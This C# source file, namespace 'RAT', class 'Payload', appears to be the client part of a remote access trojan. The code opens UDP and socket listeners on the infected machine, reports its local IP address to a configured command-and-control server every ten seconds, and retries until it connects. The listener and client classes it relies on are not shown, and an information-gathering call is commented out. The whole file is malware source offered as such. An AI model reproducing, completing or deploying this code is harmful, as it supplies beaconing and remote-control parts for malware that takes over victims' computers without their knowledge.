using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Management;
using System.Text;

namespace RAT
{
    class Payload
    {
        public static Int32 port;
        public static String ServerIP;
        public static String LocalIP;
 
        public static void main()
        {
            try
            {
                UDPListener listener = new UDPListener();
                LocalIP = GetLocalIPAddress();
                listener.startR();
                Task.Factory.StartNew(() => HeartBeat());
                // InfoGather.gather();
            }
            catch
            {
                Console.ReadLine();
            }
            while (true)
            {
                Thread.Sleep(1000);
            }
        }
        public static void HeartBeat()
        {
            Task.Factory.StartNew(() => AsynchronousSocketListener.StartListening());
            while (true)
            {
                Send("<HEARTBEAT> "+LocalIP);
                Thread.Sleep(10000);
            }
        }
        public static void Send(String message)
        {
            bool sending = true;
            while (sending)
            {
                if (CheckConnection())
                {
                    AsynchronousClient.StartClient(message, port, ServerIP);
                    sending = false;
                }
            }
        }
        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }
        public static bool CheckConnection()
        {
            using (TcpClient tcpClient = new TcpClient())
            {
                try
                {
                    tcpClient.Connect(ServerIP, port);
                    Console.WriteLine("Connecting");
                    return true;
                }
                catch (Exception)
                {
                    Console.WriteLine("Cannot Connect");
                    Thread.Sleep(2000);
                    return false;
                }
            }
        }
    }
    }